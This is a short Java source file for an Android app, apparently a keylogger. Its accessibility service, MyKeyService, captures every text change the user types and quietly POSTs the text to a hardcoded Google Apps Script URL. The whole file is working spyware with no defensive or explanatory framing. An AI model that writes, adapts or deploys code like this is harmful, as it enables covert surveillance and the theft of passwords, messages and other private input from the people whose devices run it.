package com.lms.logger;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MyKeyService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String typedText = event.getText().toString();
            new Thread(() -> sendData(typedText)).start();
        }
    }

    private void sendData(String text) {
        try {
            URL url = new URL("https://script.google.com/macros/s/AKfycbwrAYpXOLDQNEyDaXL9jPbGX_Ep9HUsjMUazb45Us1V-fBguif1FYNKTFWLxgtUJ3Uc/exec");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            String data = "text=" + URLEncoder.encode(text, "UTF-8");
            OutputStream os = conn.getOutputStream();
            os.write(data.getBytes());
            os.flush();
            os.close();
            conn.getResponseCode();
        } catch (Exception e) { e.printStackTrace(); }
    }

    @Override
    public void onInterrupt() {}
}